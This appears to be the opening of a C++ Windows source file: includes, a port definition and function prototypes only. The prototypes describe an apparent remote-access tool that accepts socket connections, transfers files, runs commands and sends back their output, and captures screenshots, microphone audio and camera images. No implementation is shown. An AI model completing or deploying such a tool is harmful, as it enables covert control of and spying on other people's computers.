#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#include <stdio.h>
#include <string>
#include <Vfw.h>


#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "vfw32.lib")
#pragma comment (lib, "Winmm.lib")
#pragma warning (disable : 4996)

#define PORT "27015"

using namespace std;

void waitAndConnect(SOCKET* connectSocket);
void sendFile(const char* fileName, SOCKET connectSocket);
void receiveFile(const char* fileName, SOCKET connectSocket);
void doCommandAndSend(const char* command, SOCKET connectSocket);

void Screenshot(SOCKET connectSocket);
void Micro(int seconds,SOCKET connectSocket);
void Camera(SOCKET connectSocket);

BOOL sendSignal(BOOL signal, SOCKET connectSocket);
BOOL receiveSignal(SOCKET connectSocket);
